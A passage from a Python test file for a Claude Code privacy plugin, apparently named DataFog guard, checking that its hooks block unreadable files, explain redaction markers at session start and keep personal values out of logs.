    box.write("scan.pdf", b"%PDF-1.7")
    out, _ = box.prompt("summarise @scan.pdf")
    assert out["decision"] == "block" and "cannot be checked" in out["reason"]


def test_prompt_mentions_are_left_to_the_read_hook_when_mentions_are_disabled(box):
    box.write("notes.txt", NOTES)
    assert box.prompt("summarise @notes.txt", CLAUDE_CODE_DISABLE_FILE_MENTIONS="1")[0] is None


# -- SessionStart ----------------------------------------------------------------
def test_session_start_explains_markers_and_reports_status(box):
    out, result = box.hook({"hook_event_name": "SessionStart", "source": "startup", "cwd": str(box.project)},
                           CLAUDE_PLUGIN_OPTION_KEEP_VAULT_ON_UNINSTALL="true")
    context = out["hookSpecificOutput"]["additionalContext"]
    assert out["hookSpecificOutput"]["hookEventName"] == "SessionStart"
    for needle in ("[[EMAIL_ABC123]]", "copy it exactly", "Never try to recover", "edit_with_markers", "fresh shell"):
        assert needle in context
    assert len(context) < 10_000
    line = out["systemMessage"]
    assert "DataFog guard: on" in line and "encrypted, key in a file beside it (weaker)" in line and "EMAIL" in line
    assert "Bash output: filtered" in line and "Markers in Bash commands: ask" in line
    assert (box.vault / "workspace.enc").exists(), "the vault is created at session start"
    assert json.loads((box.data / "runtime.json").read_text()) == {"keep_vault_on_uninstall": "true"}


def test_no_hook_writes_values_to_the_log(box):
    path = box.write("notes.txt", NOTES)
    box.pre("Read", {"file_path": str(path)})
    box.post("Bash", {"command": "cat"}, recorded.bash())
    box.prompt(f"mail {EMAIL}")
    log = (box.data / "log" / "guard.log").read_text()
    assert_no_sentinel(log)
    assert '"replaced": {"' in log and "EMAIL" in log
    for value in SENTINELS:
        assert value not in box.visible_files()
